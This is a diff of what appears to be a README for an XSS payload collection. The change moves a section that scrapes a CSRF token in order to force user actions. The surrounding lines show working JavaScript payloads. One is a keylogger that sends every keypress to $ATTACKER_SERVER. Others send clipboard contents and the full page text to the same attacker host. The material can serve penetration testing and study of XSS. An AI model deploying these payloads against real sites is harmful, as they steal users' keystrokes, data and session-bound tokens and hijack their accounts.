@@ -7,10 +7,10 @@ Originally this started as just a little list of PoC payloads but it has now exp
   + [PHPINFO + HTTPONLY WOMBO COMBO](#bypassing-httponly)
   + [FETCH](#fetch)  
   + [.$GET](#jquery-ajax)
-  + [FORCE ACTIONS WITH CSRF TOKEN](#FORCE-ACTIONS-WITH-CSRF-TOKEN)
 + **FORCING ACTIONS:**
   + [CLICK](#-forcing-actions)
   + [DENYING ACTIONS](#prevent-a-user-from-accessing-a-webpage-highly-dependent-on-where-the-xss-occurs-great-for-scenarios-where-xss-is-stored-in-a-global-banner)
+  + [FORCE ACTIONS WITH CSRF TOKEN](#FORCE-ACTIONS-WITH-CSRF-TOKEN)
 + **SETTING ITEMS:**
   + [DOCUMENT.COOKIE](#via-documentcookie)
   + [WINDOW.LOCALSTORAGE](#via-windowlocalstorage)
@@ -63,26 +63,6 @@ setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.naviga
 ```javascript
 var l = ""; document.onkeypress = function(e){;l+=e.key;fetch("https://$ATTACKER_SERVER/?q="+ l);}
 ```
-### FORCE ACTIONS WITH CSRF TOKEN
-```javascript
-fetch('/users/account')
-    .then(function(response) {
-        return response.text()
-    })
-    .then(function(html) {
-        var parser = new DOMParser();
-        var doc = parser.parseFromString(html, "text/html");
-        //capture CSRF token from page response
-        var snag = doc.getElementsByName("CSRF_TOKEN")[0].value;
-        //console.log(snag); //debug if you need it
-        //console.log(doc); //debug if you need it
-        InsertYourFunctionHere();
-
-    })
-    .catch(function(err) {
-        console.log('Failed to fetch page: ', err);
-    });
-```
 ## JQuery AJAX
 ### GET VALUE FROM LOCAL STORAGE AND $.GET
 ```javascript
@@ -104,6 +84,26 @@ $.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 
 # 💥 FORCING ACTIONS
 *For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
+### FORCE ACTIONS WITH CSRF TOKEN
+```javascript
+fetch('/users/account')
+    .then(function(response) {
+        return response.text()
+    })
+    .then(function(html) {
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(html, "text/html");
+        //capture CSRF token from page response
+        var snag = doc.getElementsByName("CSRF_TOKEN")[0].value;
+        //console.log(snag); //debug if you need it
+        //console.log(doc); //debug if you need it
+        InsertYourFunctionHere();
+
+    })
+    .catch(function(err) {
+        console.log('Failed to fetch page: ', err);
+    });
+```
 ### CLICK ELEMENT BY ID
 ```javascript
 document.getElementById("$TARGET_ELEMENT_ID").click()
